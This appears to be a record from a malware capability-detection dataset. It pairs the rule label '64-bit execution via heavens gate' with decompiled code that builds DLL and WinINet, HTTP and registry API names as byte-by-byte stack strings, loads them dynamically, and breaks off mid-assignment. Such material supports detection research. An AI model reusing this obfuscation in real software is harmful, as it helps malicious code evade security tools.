{
    "18000103": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nulong fcn.180001030(void)\n\n{\n    ulong uVar1;\n    ulong uVar2;\n    uchar uStack1144;\n    uchar uStack1143;\n    uchar uStack1142;\n    uchar uStack1141;\n    uchar uStack1140;\n    uchar uStack1139;\n    uchar uStack1138;\n    uchar uStack1137;\n    uchar uStack1136;\n    uchar uStack1128;\n    uchar uStack1127;\n    uchar uStack1126;\n    uchar uStack1125;\n    uchar uStack1124;\n    uchar uStack1123;\n    uchar uStack1122;\n    uchar uStack1121;\n    uchar uStack1120;\n    uchar uStack1119;\n    uchar uStack1112;\n    uchar uStack1111;\n    uchar uStack1110;\n    uchar uStack1109;\n    uchar uStack1108;\n    uchar uStack1107;\n    uchar uStack1106;\n    uchar uStack1105;\n    uchar uStack1104;\n    uchar uStack1103;\n    uchar uStack1096;\n    uchar uStack1095;\n    uchar uStack1094;\n    uchar uStack1093;\n    uchar uStack1092;\n    uchar uStack1091;\n    uchar uStack1090;\n    uchar uStack1089;\n    uchar uStack1088;\n    uchar uStack1087;\n    uchar uStack1080;\n    uchar uStack1079;\n    uchar uStack1078;\n    uchar uStack1077;\n    uchar uStack1076;\n    uchar uStack1075;\n    uchar uStack1074;\n    uchar uStack1073;\n    uchar uStack1072;\n    uchar uStack1071;\n    uchar uStack1070;\n    uchar uStack1064;\n    uchar uStack1063;\n    uchar uStack1062;\n    uchar uStack1061;\n    uchar uStack1060;\n    uchar uStack1059;\n    uchar uStack1058;\n    uchar uStack1057;\n    uchar uStack1056;\n    uchar uStack1055;\n    uchar uStack1054;\n    uchar uStack1048;\n    uchar uStack1047;\n    uchar uStack1046;\n    uchar uStack1045;\n    uchar uStack1044;\n    uchar uStack1043;\n    uchar uStack1042;\n    uchar uStack1041;\n    uchar uStack1040;\n    uchar uStack1039;\n    uchar uStack1038;\n    uchar uStack1037;\n    uchar uStack1032;\n    uchar uStack1031;\n    uchar uStack1030;\n    uchar uStack1029;\n    uchar uStack1028;\n    uchar uStack1027;\n    uchar uStack1026;\n    uchar uStack1025;\n    uchar uStack1024;\n    uchar uStack1023;\n    uchar uStack1022;\n    uchar uStack1021;\n    uchar uStack1016;\n    uchar uStack1015;\n    uchar uStack1014;\n    uchar uStack1013;\n    uchar uStack1012;\n    uchar uStack1011;\n    uchar uStack1010;\n    uchar uStack1009;\n    uchar uStack1008;\n    uchar uStack1007;\n    uchar uStack1006;\n    uchar uStack1005;\n    uchar uStack1000;\n    uchar uStack999;\n    uchar uStack998;\n    uchar uStack997;\n    uchar uStack996;\n    uchar uStack995;\n    uchar uStack994;\n    uchar uStack993;\n    uchar uStack992;\n    uchar uStack991;\n    uchar uStack990;\n    uchar uStack989;\n    uchar uStack984;\n    uchar uStack983;\n    uchar uStack982;\n    uchar uStack981;\n    uchar uStack980;\n    uchar uStack979;\n    uchar uStack978;\n    uchar uStack977;\n    uchar uStack976;\n    uchar uStack975;\n    uchar uStack974;\n    uchar uStack973;\n    uchar uStack968;\n    uchar uStack967;\n    uchar uStack966;\n    uchar uStack965;\n    uchar uStack964;\n    uchar uStack963;\n    uchar uStack962;\n    uchar uStack961;\n    uchar uStack960;\n    uchar uStack959;\n    uchar uStack958;\n    uchar uStack957;\n    uchar uStack952;\n    uchar uStack951;\n    uchar uStack950;\n    uchar uStack949;\n    uchar uStack948;\n    uchar uStack947;\n    uchar uStack946;\n    uchar uStack945;\n    uchar uStack944;\n    uchar uStack943;\n    uchar uStack942;\n    uchar uStack941;\n    uchar uStack936;\n    uchar uStack935;\n    uchar uStack934;\n    uchar uStack933;\n    uchar uStack932;\n    uchar uStack931;\n    uchar uStack930;\n    uchar uStack929;\n    uchar uStack928;\n    uchar uStack927;\n    uchar uStack926;\n    uchar uStack925;\n    uchar uStack924;\n    uchar uStack920;\n    uchar uStack919;\n    uchar uStack918;\n    uchar uStack917;\n    uchar uStack916;\n    uchar uStack915;\n    uchar uStack914;\n    uchar uStack913;\n    uchar uStack912;\n    uchar uStack911;\n    uchar uStack910;\n    uchar uStack909;\n    uchar uStack908;\n    uchar uStack904;\n    uchar uStack903;\n    uchar uStack902;\n    uchar uStack901;\n    uchar uStack900;\n    uchar uStack899;\n    uchar uStack898;\n    uchar uStack897;\n    uchar uStack896;\n    uchar uStack895;\n    uchar uStack894;\n    uchar uStack893;\n    uchar uStack892;\n    uchar uStack891;\n    uchar uStack888;\n    uchar uStack887;\n    uchar uStack886;\n    uchar uStack885;\n    uchar uStack884;\n    uchar uStack883;\n    uchar uStack882;\n    uchar uStack881;\n    uchar uStack880;\n    uchar uStack879;\n    uchar uStack878;\n    uchar uStack877;\n    uchar uStack876;\n    uchar uStack875;\n    uchar uStack872;\n    uchar uStack871;\n    uchar uStack870;\n    uchar uStack869;\n    uchar uStack868;\n    uchar uStack867;\n    uchar uStack866;\n    uchar uStack865;\n    uchar uStack864;\n    uchar uStack863;\n    uchar uStack862;\n    uchar uStack861;\n    uchar uStack860;\n    uchar uStack859;\n    uchar uStack856;\n    uchar uStack855;\n    uchar uStack854;\n    uchar uStack853;\n    uchar uStack852;\n    uchar uStack851;\n    uchar uStack850;\n    uchar uStack849;\n    uchar uStack848;\n    uchar uStack847;\n    uchar uStack846;\n    uchar uStack845;\n    uchar uStack844;\n    uchar uStack843;\n    uchar uStack840;\n    uchar uStack839;\n    uchar uStack838;\n    uchar uStack837;\n    uchar uStack836;\n    uchar uStack835;\n    uchar uStack834;\n    uchar uStack833;\n    uchar uStack832;\n    uchar uStack831;\n    uchar uStack830;\n    uchar uStack829;\n    uchar uStack828;\n    uchar uStack827;\n    uchar uStack826;\n    uchar uStack824;\n    uchar uStack823;\n    uchar uStack822;\n    uchar uStack821;\n    uchar uStack820;\n    uchar uStack819;\n    uchar uStack818;\n    uchar uStack817;\n    uchar uStack816;\n    uchar uStack815;\n    uchar uStack814;\n    uchar uStack813;\n    uchar uStack812;\n    uchar uStack811;\n    uchar uStack810;\n    uchar uStack808;\n    uchar uStack807;\n    uchar uStack806;\n    uchar uStack805;\n    uchar uStack804;\n    uchar uStack803;\n    uchar uStack802;\n    uchar uStack801;\n    uchar uStack800;\n    uchar uStack799;\n    uchar uStack798;\n    uchar uStack797;\n    uchar uStack796;\n    uchar uStack795;\n    uchar uStack794;\n    uchar uStack792;\n    uchar uStack791;\n    uchar uStack790;\n    uchar uStack789;\n    uchar uStack788;\n    uchar uStack787;\n    uchar uStack786;\n    uchar uStack785;\n    uchar uStack784;\n    uchar uStack783;\n    uchar uStack782;\n    uchar uStack781;\n    uchar uStack780;\n    uchar uStack779;\n    uchar uStack778;\n    uchar uStack776;\n    uchar uStack775;\n    uchar uStack774;\n    uchar uStack773;\n    uchar uStack772;\n    uchar uStack771;\n    uchar uStack770;\n    uchar uStack769;\n    uchar uStack768;\n    uchar uStack767;\n    uchar uStack766;\n    uchar uStack765;\n    uchar uStack764;\n    uchar uStack763;\n    uchar uStack762;\n    uchar uStack760;\n    uchar uStack759;\n    uchar uStack758;\n    uchar uStack757;\n    uchar uStack756;\n    uchar uStack755;\n    uchar uStack754;\n    uchar uStack753;\n    uchar uStack752;\n    uchar uStack751;\n    uchar uStack750;\n    uchar uStack749;\n    uchar uStack748;\n    uchar uStack747;\n    uchar uStack746;\n    uchar uStack744;\n    uchar uStack743;\n    uchar uStack742;\n    uchar uStack741;\n    uchar uStack740;\n    uchar uStack739;\n    uchar uStack738;\n    uchar uStack737;\n    uchar uStack736;\n    uchar uStack735;\n    uchar uStack734;\n    uchar uStack733;\n    uchar uStack732;\n    uchar uStack731;\n    uchar uStack730;\n    uchar uStack728;\n    uchar uStack727;\n    uchar uStack726;\n    uchar uStack725;\n    uchar uStack724;\n    uchar uStack723;\n    uchar uStack722;\n    uchar uStack721;\n    uchar uStack720;\n    uchar uStack719;\n    uchar uStack718;\n    uchar uStack717;\n    uchar uStack716;\n    uchar uStack715;\n    uchar uStack714;\n    uchar uStack713;\n    uchar uStack712;\n    uchar uStack711;\n    uchar uStack710;\n    uchar uStack709;\n    uchar uStack708;\n    uchar uStack707;\n    uchar uStack706;\n    uchar uStack705;\n    uchar uStack704;\n    uchar uStack703;\n    uchar uStack702;\n    uchar uStack701;\n    uchar uStack700;\n    uchar uStack699;\n    uchar uStack698;\n    uchar uStack697;\n    uchar uStack696;\n    uchar uStack695;\n    uchar uStack694;\n    uchar uStack693;\n    uchar uStack692;\n    uchar uStack691;\n    uchar uStack690;\n    uchar uStack689;\n    uchar uStack688;\n    uchar uStack687;\n    uchar uStack686;\n    uchar uStack685;\n    uchar uStack684;\n    uchar uStack683;\n    uchar uStack682;\n    uchar uStack681;\n    uchar uStack680;\n    uchar uStack679;\n    uchar uStack678;\n    uchar uStack677;\n    uchar uStack676;\n    uchar uStack675;\n    uchar uStack674;\n    uchar uStack673;\n    uchar uStack672;\n    uchar uStack671;\n    uchar uStack670;\n    uchar uStack669;\n    uchar uStack668;\n    uchar uStack667;\n    uchar uStack666;\n    uchar uStack665;\n    uchar uStack664;\n    uchar uStack656;\n    uchar uStack655;\n    uchar uStack654;\n    uchar uStack653;\n    uchar uStack652;\n    uchar uStack651;\n    uchar uStack650;\n    uchar uStack649;\n    uchar uStack648;\n    uchar uStack647;\n    uchar uStack646;\n    uchar uStack645;\n    uchar uStack644;\n    uchar uStack643;\n    uchar uStack642;\n    uchar uStack641;\n    uchar uStack640;\n    uchar uStack632;\n    uchar uStack631;\n    uchar uStack630;\n    uchar uStack629;\n    uchar uStack628;\n    uchar uStack627;\n    uchar uStack626;\n    uchar uStack625;\n    uchar uStack624;\n    uchar uStack623;\n    uchar uStack622;\n    uchar uStack621;\n    uchar uStack620;\n    uchar uStack619;\n    uchar uStack618;\n    uchar uStack617;\n    uchar uStack616;\n    uchar uStack608;\n    uchar uStack607;\n    uchar uStack606;\n    uchar uStack605;\n    uchar uStack604;\n    uchar uStack603;\n    uchar uStack602;\n    uchar uStack601;\n    uchar uStack600;\n    uchar uStack599;\n    uchar uStack598;\n    uchar uStack597;\n    uchar uStack596;\n    uchar uStack595;\n    uchar uStack594;\n    uchar uStack593;\n    uchar uStack592;\n    uchar uStack584;\n    uchar uStack583;\n    uchar uStack582;\n    uchar uStack581;\n    uchar uStack580;\n    uchar uStack579;\n    uchar uStack578;\n    uchar uStack577;\n    uchar uStack576;\n    uchar uStack575;\n    uchar uStack574;\n    uchar uStack573;\n    uchar uStack572;\n    uchar uStack571;\n    uchar uStack570;\n    uchar uStack569;\n    uchar uStack568;\n    uchar uStack560;\n    uchar uStack559;\n    uchar uStack558;\n    uchar uStack557;\n    uchar uStack556;\n    uchar uStack555;\n    uchar uStack554;\n    uchar uStack553;\n    uchar uStack552;\n    uchar uStack551;\n    uchar uStack550;\n    uchar uStack549;\n    uchar uStack548;\n    uchar uStack547;\n    uchar uStack546;\n    uchar uStack545;\n    uchar uStack544;\n    uchar uStack536;\n    uchar uStack535;\n    uchar uStack534;\n    uchar uStack533;\n    uchar uStack532;\n    uchar uStack531;\n    uchar uStack530;\n    uchar uStack529;\n    uchar uStack528;\n    uchar uStack527;\n    uchar uStack526;\n    uchar uStack525;\n    uchar uStack524;\n    uchar uStack523;\n    uchar uStack522;\n    uchar uStack521;\n    uchar uStack520;\n    uchar uStack512;\n    uchar uStack511;\n    uchar uStack510;\n    uchar uStack509;\n    uchar uStack508;\n    uchar uStack507;\n    uchar uStack506;\n    uchar uStack505;\n    uchar uStack504;\n    uchar uStack503;\n    uchar uStack502;\n    uchar uStack501;\n    uchar uStack500;\n    uchar uStack499;\n    uchar uStack498;\n    uchar uStack497;\n    uchar uStack496;\n    uchar uStack488;\n    uchar uStack487;\n    uchar uStack486;\n    uchar uStack485;\n    uchar uStack484;\n    uchar uStack483;\n    uchar uStack482;\n    uchar uStack481;\n    uchar uStack480;\n    uchar uStack479;\n    uchar uStack478;\n    uchar uStack477;\n    uchar uStack476;\n    uchar uStack475;\n    uchar uStack474;\n    uchar uStack473;\n    uchar uStack472;\n    uchar uStack471;\n    uchar uStack464;\n    uchar uStack463;\n    uchar uStack462;\n    uchar uStack461;\n    uchar uStack460;\n    uchar uStack459;\n    uchar uStack458;\n    uchar uStack457;\n    uchar uStack456;\n    uchar uStack455;\n    uchar uStack454;\n    uchar uStack453;\n    uchar uStack452;\n    uchar uStack451;\n    uchar uStack450;\n    uchar uStack449;\n    uchar uStack448;\n    uchar uStack447;\n    uchar uStack446;\n    uchar uStack440;\n    uchar uStack439;\n    uchar uStack438;\n    uchar uStack437;\n    uchar uStack436;\n    uchar uStack435;\n    uchar uStack434;\n    uchar uStack433;\n    uchar uStack432;\n    uchar uStack431;\n    uchar uStack430;\n    uchar uStack429;\n    uchar uStack428;\n    uchar uStack427;\n    uchar uStack426;\n    uchar uStack425;\n    uchar uStack424;\n    uchar uStack423;\n    uchar uStack422;\n    uchar uStack416;\n    uchar uStack415;\n    uchar uStack414;\n    uchar uStack413;\n    uchar uStack412;\n    uchar uStack411;\n    uchar uStack410;\n    uchar uStack409;\n    uchar uStack408;\n    uchar uStack407;\n    uchar uStack406;\n    uchar uStack405;\n    uchar uStack404;\n    uchar uStack403;\n    uchar uStack402;\n    uchar uStack401;\n    uchar uStack400;\n    uchar uStack399;\n    uchar uStack398;\n    uchar uStack392;\n    uchar uStack391;\n    uchar uStack390;\n    uchar uStack389;\n    uchar uStack388;\n    uchar uStack387;\n    uchar uStack386;\n    uchar uStack385;\n    uchar uStack384;\n    uchar uStack383;\n    uchar uStack382;\n    uchar uStack381;\n    uchar uStack380;\n    uchar uStack379;\n    uchar uStack378;\n    uchar uStack377;\n    uchar uStack376;\n    uchar uStack375;\n    uchar uStack374;\n    uchar uStack373;\n    uchar uStack368;\n    uchar uStack367;\n    uchar uStack366;\n    uchar uStack365;\n    uchar uStack364;\n    uchar uStack363;\n    uchar uStack362;\n    uchar uStack361;\n    uchar uStack360;\n    uchar uStack359;\n    uchar uStack358;\n    uchar uStack357;\n    uchar uStack356;\n    uchar uStack355;\n    uchar uStack354;\n    uchar uStack353;\n    uchar uStack352;\n    uchar uStack351;\n    uchar uStack350;\n    uchar uStack349;\n    uchar uStack344;\n    uchar uStack343;\n    uchar uStack342;\n    uchar uStack341;\n    uchar uStack340;\n    uchar uStack339;\n    uchar uStack338;\n    uchar uStack337;\n    uchar uStack336;\n    uchar uStack335;\n    uchar uStack334;\n    uchar uStack333;\n    uchar uStack332;\n    uchar uStack331;\n    uchar uStack330;\n    uchar uStack329;\n    uchar uStack328;\n    uchar uStack327;\n    uchar uStack326;\n    uchar uStack325;\n    uchar uStack324;\n    uchar uStack320;\n    uchar uStack319;\n    uchar uStack318;\n    uchar uStack317;\n    uchar uStack316;\n    uchar uStack315;\n    uchar uStack314;\n    uchar uStack313;\n    uchar uStack312;\n    uchar uStack311;\n    uchar uStack310;\n    uchar uStack309;\n    uchar uStack308;\n    uchar uStack307;\n    uchar uStack306;\n    uchar uStack305;\n    uchar uStack304;\n    uchar uStack303;\n    uchar uStack302;\n    uchar uStack301;\n    uchar uStack300;\n    uchar uStack296;\n    uchar uStack295;\n    uchar uStack294;\n    uchar uStack293;\n    uchar uStack292;\n    uchar uStack291;\n    uchar uStack290;\n    uchar uStack289;\n    uchar uStack288;\n    uchar uStack287;\n    uchar uStack286;\n    uchar uStack285;\n    uchar uStack284;\n    uchar uStack283;\n    uchar uStack282;\n    uchar uStack281;\n    uchar uStack280;\n    uchar uStack279;\n    uchar uStack278;\n    uchar uStack277;\n    uchar uStack276;\n    uchar uStack272;\n    uchar uStack271;\n    uchar uStack270;\n    uchar uStack269;\n    uchar uStack268;\n    uchar uStack267;\n    uchar uStack266;\n    uchar uStack265;\n    uchar uStack264;\n    uchar uStack263;\n    uchar uStack262;\n    uchar uStack261;\n    uchar uStack260;\n    uchar uStack259;\n    uchar uStack258;\n    uchar uStack257;\n    uchar uStack256;\n    uchar uStack255;\n    uchar uStack254;\n    uchar uStack253;\n    uchar uStack252;\n    uchar uStack248;\n    uchar uStack247;\n    uchar uStack246;\n    uchar uStack245;\n    uchar uStack244;\n    uchar uStack243;\n    uchar uStack242;\n    uchar uStack241;\n    uchar uStack240;\n    uchar uStack239;\n    uchar uStack238;\n    uchar uStack237;\n    uchar uStack236;\n    uchar uStack235;\n    uchar uStack234;\n    uchar uStack233;\n    uchar uStack232;\n    uchar uStack231;\n    uchar uStack230;\n    uchar uStack229;\n    uchar uStack228;\n    uchar uStack224;\n    uchar uStack223;\n    uchar uStack222;\n    uchar uStack221;\n    uchar uStack220;\n    uchar uStack219;\n    uchar uStack218;\n    uchar uStack217;\n    uchar uStack216;\n    uchar uStack215;\n    uchar uStack214;\n    uchar uStack213;\n    uchar uStack212;\n    uchar uStack211;\n    uchar uStack210;\n    uchar uStack209;\n    uchar uStack208;\n    uchar uStack207;\n    uchar uStack206;\n    uchar uStack205;\n    uchar uStack204;\n    uchar uStack203;\n    uchar uStack200;\n    uchar uStack199;\n    uchar uStack198;\n    uchar uStack197;\n    uchar uStack196;\n    uchar uStack195;\n    uchar uStack194;\n    uchar uStack193;\n    uchar uStack192;\n    uchar uStack191;\n    uchar uStack190;\n    uchar uStack189;\n    uchar uStack188;\n    uchar uStack187;\n    uchar uStack186;\n    uchar uStack185;\n    uchar uStack184;\n    uchar uStack183;\n    uchar uStack182;\n    uchar uStack181;\n    uchar uStack180;\n    uchar uStack179;\n    uchar uStack178;\n    uchar uStack177;\n    uchar uStack176;\n    uchar uStack175;\n    uchar uStack174;\n    uchar uStack173;\n    uchar uStack172;\n    uchar uStack171;\n    uchar uStack170;\n    uchar uStack169;\n    uchar uStack168;\n    uchar uStack167;\n    uchar uStack166;\n    uchar uStack165;\n    uchar uStack164;\n    uchar uStack163;\n    uchar uStack162;\n    uchar uStack161;\n    uchar uStack160;\n    uchar uStack159;\n    uchar uStack158;\n    uchar uStack157;\n    uchar uStack156;\n    uchar uStack155;\n    uchar uStack154;\n    uchar uStack153;\n    uchar uStack152;\n    uchar uStack144;\n    uchar uStack143;\n    uchar uStack142;\n    uchar uStack141;\n    uchar uStack140;\n    uchar uStack139;\n    uchar uStack138;\n    uchar uStack137;\n    uchar uStack136;\n    uchar uStack135;\n    uchar uStack134;\n    uchar uStack133;\n    uchar uStack132;\n    uchar uStack131;\n    uchar uStack130;\n    uchar uStack129;\n    uchar uStack128;\n    uchar uStack127;\n    uchar uStack126;\n    uchar uStack125;\n    uchar uStack124;\n    uchar uStack123;\n    uchar uStack122;\n    uchar uStack121;\n    uchar uStack120;\n    uchar uStack112;\n    uchar uStack111;\n    uchar uStack110;\n    uchar uStack109;\n    uchar uStack108;\n    uchar uStack107;\n    uchar uStack106;\n    uchar uStack105;\n    uchar uStack104;\n    uchar uStack103;\n    uchar uStack102;\n    uchar uStack101;\n    uchar uStack100;\n    uchar uStack99;\n    uchar uStack98;\n    uchar uStack97;\n    uchar uStack96;\n    uchar uStack95;\n    uchar uStack94;\n    uchar uStack93;\n    uchar uStack92;\n    uchar uStack91;\n    uchar uStack90;\n    uchar uStack89;\n    uchar uStack88;\n    uchar uStack87;\n    uchar uStack86;\n    uchar uStack80;\n    uchar uStack79;\n    uchar uStack78;\n    uchar uStack77;\n    uchar uStack76;\n    uchar uStack75;\n    uchar uStack74;\n    uchar uStack73;\n    uchar uStack72;\n    uchar uStack71;\n    uchar uStack70;\n    uchar uStack69;\n    uchar uStack68;\n    uchar uStack67;\n    uchar uStack66;\n    uchar uStack65;\n    uchar uStack64;\n    uchar uStack63;\n    uchar uStack62;\n    uchar uStack61;\n    uchar uStack60;\n    ulong uStack56;\n    ulong uStack48;\n    ulong uStack40;\n    ulong uStack32;\n    ulong uStack24;\n    \n    uStack920 = 0x6b;\n    uStack919 = 0x65;\n    uStack918 = 0x72;\n    uStack917 = 0x6e;\n    uStack916 = 0x65;\n    uStack915 = 0x6c;\n    uStack914 = 0x33;\n    uStack913 = 0x32;\n    uStack912 = 0x2e;\n    uStack911 = 100;\n    uStack910 = 0x6c;\n    uStack909 = 0x6c;\n    uStack908 = 0;\n    uStack1048 = 0x77;\n    uStack1047 = 0x69;\n    uStack1046 = 0x6e;\n    uStack1045 = 0x69;\n    uStack1044 = 0x6e;\n    uStack1043 = 0x65;\n    uStack1042 = 0x74;\n    uStack1041 = 0x2e;\n    uStack1040 = 100;\n    uStack1039 = 0x6c;\n    uStack1038 = 0x6c;\n    uStack1037 = 0;\n    uStack936 = 0x61;\n    uStack935 = 100;\n    uStack934 = 0x76;\n    uStack933 = 0x61;\n    uStack932 = 0x70;\n    uStack931 = 0x69;\n    uStack930 = 0x33;\n    uStack929 = 0x32;\n    uStack928 = 0x2e;\n    uStack927 = 100;\n    uStack926 = 0x6c;\n    uStack925 = 0x6c;\n    uStack924 = 0;\n    uStack1080 = 0x75;\n    uStack1079 = 0x73;\n    uStack1078 = 0x65;\n    uStack1077 = 0x72;\n    uStack1076 = 0x33;\n    uStack1075 = 0x32;\n    uStack1074 = 0x2e;\n    uStack1073 = 100;\n    uStack1072 = 0x6c;\n    uStack1071 = 0x6c;\n    uStack1070 = 0;\n    uStack1032 = 0x73;\n    uStack1031 = 0x68;\n    uStack1030 = 0x65;\n    uStack1029 = 0x6c;\n    uStack1028 = 0x6c;\n    uStack1027 = 0x33;\n    uStack1026 = 0x32;\n    uStack1025 = 0x2e;\n    uStack1024 = 100;\n    uStack1023 = 0x6c;\n    uStack1022 = 0x6c;\n    uStack1021 = 0;\n    uStack1128 = 0x70;\n    uStack1127 = 0x73;\n    uStack1126 = 0x61;\n    uStack1125 = 0x70;\n    uStack1124 = 0x69;\n    uStack1123 = 0x2e;\n    uStack1122 = 100;\n    uStack1121 = 0x6c;\n    uStack1120 = 0x6c;\n    uStack1119 = 0;\n    uStack1016 = 0x57;\n    uStack1015 = 0x49;\n    uStack1014 = 0x4e;\n    uStack1013 = 0x49;\n    uStack1012 = 0x4e;\n    uStack1011 = 0x45;\n    uStack1010 = 0x54;\n    uStack1009 = 0x2e;\n    uStack1008 = 100;\n    uStack1007 = 0x6c;\n    uStack1006 = 0x6c;\n    uStack1005 = 0;\n    uStack1112 = 0x6e;\n    uStack1111 = 0x74;\n    uStack1110 = 100;\n    uStack1109 = 0x6c;\n    uStack1108 = 0x6c;\n    uStack1107 = 0x2e;\n    uStack1106 = 100;\n    uStack1105 = 0x6c;\n    uStack1104 = 0x6c;\n    uStack1103 = 0;\n    uStack24 = 0;\n    uStack48 = 0;\n    uStack56 = 0;\n    uStack32 = 0;\n    uStack40 = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(&uStack920);\n    (*_sym.imp.KERNEL32.dll_LoadLibraryA)(&uStack1048);\n    uStack56 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(&uStack936);\n    uStack24 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(&uStack1080);\n    uStack48 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(&uStack1032);\n    uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(&uStack1016);\n    uStack32 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(&uStack1128);\n    uStack40 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(&uStack1112);\n    uStack760 = 0x48;\n    uStack759 = 0x74;\n    uStack758 = 0x74;\n    uStack757 = 0x70;\n    uStack756 = 0x51;\n    uStack755 = 0x75;\n    uStack754 = 0x65;\n    uStack753 = 0x72;\n    uStack752 = 0x79;\n    uStack751 = 0x49;\n    uStack750 = 0x6e;\n    uStack749 = 0x66;\n    uStack748 = 0x6f;\n    uStack747 = 0x41;\n    uStack746 = 0;\n    uStack112 = 0x49;\n    uStack111 = 0x6e;\n    uStack110 = 0x74;\n    uStack109 = 0x65;\n    uStack108 = 0x72;\n    uStack107 = 0x6e;\n    uStack106 = 0x65;\n    uStack105 = 0x74;\n    uStack104 = 0x51;\n    uStack103 = 0x75;\n    uStack102 = 0x65;\n    uStack101 = 0x72;\n    uStack100 = 0x79;\n    uStack99 = 0x44;\n    uStack98 = 0x61;\n    uStack97 = 0x74;\n    uStack96 = 0x61;\n    uStack95 = 0x41;\n    uStack94 = 0x76;\n    uStack93 = 0x61;\n    uStack92 = 0x69;\n    uStack91 = 0x6c;\n    uStack90 = 0x61;\n    uStack89 = 0x62;\n    uStack88 = 0x6c;\n    uStack87 = 0x65;\n    uStack86 = 0;\n    uStack680 = 0x48;\n    uStack679 = 0x74;\n    uStack678 = 0x74;\n    uStack677 = 0x70;\n    uStack676 = 0x4f;\n    uStack675 = 0x70;\n    uStack674 = 0x65;\n    uStack673 = 0x6e;\n    uStack672 = 0x52;\n    uStack671 = 0x65;\n    uStack670 = 0x71;\n    uStack669 = 0x75;\n    uStack668 = 0x65;\n    uStack667 = 0x73;\n    uStack666 = 0x74;\n    uStack665 = 0x41;\n    uStack664 = 0;\n    uStack176 = 0x49;\n    uStack175 = 0x6e;\n    uStack174 = 0x74;\n    uStack173 = 0x65;\n    uStack172 = 0x72;\n    uStack171 = 0x6e;\n    uStack170 = 0x65;\n    uStack169 = 0x74;\n    uStack168 = 0x43;\n    uStack167 = 0x61;\n    uStack166 = 0x6e;\n    uStack165 = 0x6f;\n    uStack164 = 0x6e;\n    uStack163 = 0x69;\n    uStack162 = 99;\n    uStack161 = 0x61;\n    uStack160 = 0x6c;\n    uStack159 = 0x69;\n    uStack158 = 0x7a;\n    uStack157 = 0x65;\n    uStack156 = 0x55;\n    uStack155 = 0x72;\n    uStack154 = 0x6c;\n    uStack153 = 0x41;\n    uStack152 = 0;\n    uStack488 = 0x49;\n    uStack487 = 0x6e;\n    uStack486 = 0x74;\n    uStack485 = 0x65;\n    uStack484 = 0x72;\n    uStack483 = 0x6e;\n    uStack482 = 0x65;\n    uStack481 = 0x74;\n    uStack480 = 0x43;\n    uStack479 = 0x72;\n    uStack478 = 0x61;\n    uStack477 = 99;\n    uStack476 = 0x6b;\n    uStack475 = 0x55;\n    uStack474 = 0x72;\n    uStack473 = 0x6c;\n    uStack472 = 0x41;\n    uStack471 = 0;\n    uStack904 = 0x49;\n    uStack903 = 0x6e;\n    uStack902 = 0x74;\n    uStack901 = 0x65;\n    uStack900 = 0x72;\n    uStack899 = 0x6e;\n    uStack898 = 0x65;\n    uStack897 = 0x74;\n    uStack896 = 0x4f;\n    uStack895 = 0x70;\n    uStack894 = 0x65;\n    uStack893 = 0x6e;\n    uStack892 = 0x57;\n    uStack891 = 0;\n    uStack656 = 0x49;\n    uStack655 = 0x6e;\n    uStack654 = 0x74;\n    uStack653 = 0x65;\n    uStack652 = 0x72;\n    uStack651 = 0x6e;\n    uStack650 = 0x65;\n    uStack649 = 0x74;\n    uStack648 = 0x52;\n    uStack647 = 0x65;\n    uStack646 = 0x61;\n    uStack645 = 100;\n    uStack644 = 0x46;\n    uStack643 = 0x69;\n    uStack642 = 0x6c;\n    uStack641 = 0x65;\n    uStack640 = 0;\n    uStack416 = 0x49;\n    uStack415 = 0x6e;\n    uStack414 = 0x74;\n    uStack413 = 0x65;\n    uStack412 = 0x72;\n    uStack411 = 0x6e;\n    uStack410 = 0x65;\n    uStack409 = 0x74;\n    uStack408 = 0x53;\n    uStack407 = 0x65;\n    uStack406 = 0x74;\n    uStack405 = 0x4f;\n    uStack404 = 0x70;\n    uStack403 = 0x74;\n    uStack402 = 0x69;\n    uStack401 = 0x6f;\n    uStack400 = 0x6e;\n    uStack399 = 0x57;\n    uStack398 = 0;\n    uStack632 = 0x49;\n    uStack631 = 0x6e;\n    uStack630 = 0x74;\n    uStack629 = 0x65;\n    uStack628 = 0x72;\n    uStack627 = 0x6e;\n    uStack626 = 0x65;\n    uStack625 = 0x74;\n    uStack624 = 0x43;\n    uStack623 = 0x6f;\n    uStack622 = 0x6e;\n    uStack621 = 0x6e;\n    uStack620 = 0x65;\n    uStack619 = 99;\n    uStack618 = 0x74;\n    uStack617 = 0x41;\n    uStack616 = 0;\n    uStack608 = 0x48;\n    uStack607 = 0x74;\n    uStack606 = 0x74;\n    uStack605 = 0x70;\n    uStack604 = 0x53;\n    uStack603 = 0x65;\n    uStack602 = 0x6e;\n    uStack601 = 100;\n    uStack600 = 0x52;\n    uStack599 = 0x65;\n    uStack598 = 0x71;\n    uStack597 = 0x75;\n    uStack596 = 0x65;\n    uStack595 = 0x73;\n    uStack594 = 0x74;\n    uStack593 = 0x41;\n    uStack592 = 0;\n    uStack392 = 0x49;\n    uStack391 = 0x6e;\n    uStack390 = 0x74;\n    uStack389 = 0x65;\n    uStack388 = 0x72;\n    uStack387 = 0x6e;\n    uStack386 = 0x65;\n    uStack385 = 0x74;\n    uStack384 = 0x43;\n    uStack383 = 0x6c;\n    uStack382 = 0x6f;\n    uStack381 = 0x73;\n    uStack380 = 0x65;\n    uStack379 = 0x48;\n    uStack378 = 0x61;\n    uStack377 = 0x6e;\n    uStack376 = 100;\n    uStack375 = 0x6c;\n    uStack374 = 0x65;\n    uStack373 = 0;\n    uStack744 = 0x48;\n    uStack743 = 0x74;\n    uStack742 = 0x74;\n    uStack741 = 0x70;\n    uStack740 = 0x51;\n    uStack739 = 0x75;\n    uStack738 = 0x65;\n    uStack737 = 0x72;\n    uStack736 = 0x79;\n    uStack735 = 0x49;\n    uStack734 = 0x6e;\n    uStack733 = 0x66;\n    uStack732 = 0x6f;\n    uStack731 = 0x57;\n    uStack730 = 0;\n    uStack888 = 0x52;\n    uStack887 = 0x65;\n    uStack886 = 0x67;\n    uStack885 = 0x4f;\n    uStack884 = 0x70;\n    uStack883 = 0x65;\n    uStack882 = 0x6e;\n    uStack881 = 0x4b;\n    uStack880 = 0x65;\n    uStack879 = 0x79;\n    uStack878 = 0x45;\n    uStack877 = 